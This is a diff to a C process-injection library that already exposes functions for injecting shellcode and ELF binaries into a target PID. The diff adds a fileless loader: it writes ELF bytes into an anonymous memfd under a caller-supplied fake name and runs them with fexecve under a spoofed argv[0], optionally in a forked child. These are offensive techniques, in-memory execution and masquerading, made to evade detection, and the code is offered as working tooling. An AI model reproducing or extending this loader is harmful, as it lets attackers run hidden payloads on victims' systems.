@@ -1,5 +1,6 @@
 #ifndef INJECT_MEMORY_H_
 #define INJECT_MEMORY_H_
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdbool.h>
 #include <stdarg.h>
@@ -18,7 +19,10 @@
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <signal.h>
+#include <sys/mman.h>
+#include <linux/fcntl.h>
 
+#define MFD_CLOEXEC_ 0x0001U
 
 /*
     Exposed Library Functions Here
@@ -27,6 +31,7 @@
 
 extern bool inject_memory_inject_code(const char* pid_, char* shellcode,size_t shellcode_size);
 extern bool inject_memory_inject_elf(const char* pid, char* elf_bytes,size_t elf_size);
+extern bool inject_memory_memfd_execute_elf(char* elf_bytes, size_t elf_size,const char* fake_name,bool is_script,bool fork_proc);
 
 #endif
 
@@ -380,4 +385,46 @@ bool inject_memory_inject_elf(const char* pid, char* elf_bytes,size_t elf_size){
     exit(-1);
 }
 
+extern bool inject_memory_memfd_execute_elf(char* elf_bytes, size_t elf_size,const char* fake_name, bool is_script,bool fork_proc){
+	int fd = memfd_create(fake_name,is_script ? 0 : MFD_CLOEXEC_);
+	if (fd == -1){
+		fprintf(stderr,"ERROR: memfd_create failed %d",errno);
+		return false;
+	}
+	int nwrote = write(fd,elf_bytes,elf_size);
+	if (nwrote != elf_size){
+		fprintf(stderr,"ERROR: failed to write bytes %d",errno);
+		close(fd);
+		return false;
+	}
+	inject_debug_print("DEBUG: wrote %d\n",nwrote);
+	inject_debug_print("DEBUG: attempting execve.\n");
+	char* fake_argv[] = {fake_name,NULL};
+	char* fake_env[] =  {NULL,NULL};
+	if (!fork_proc){
+		if (fexecve(fd,fake_argv,fake_env) == -1){
+			fprintf(stderr,"ERROR: failed to execve %d",errno);
+			close(fd);		
+			return false;
+		}
+		close(fd);		
+		return true;
+	}
+	pid_t pid = fork();
+	if (pid < 0) {
+		fprintf(stderr,"ERROR: failed to fork %d",errno);
+		exit(1);
+	} else if (pid == 0){
+		if (fexecve(fd,fake_argv,fake_env) == -1){
+			fprintf(stderr,"ERROR: failed to execve %d",errno);
+			close(fd);		
+			return false;
+		}
+	} else {
+		close(fd);
+		return true;
+	}
+}
+
 #endif
+
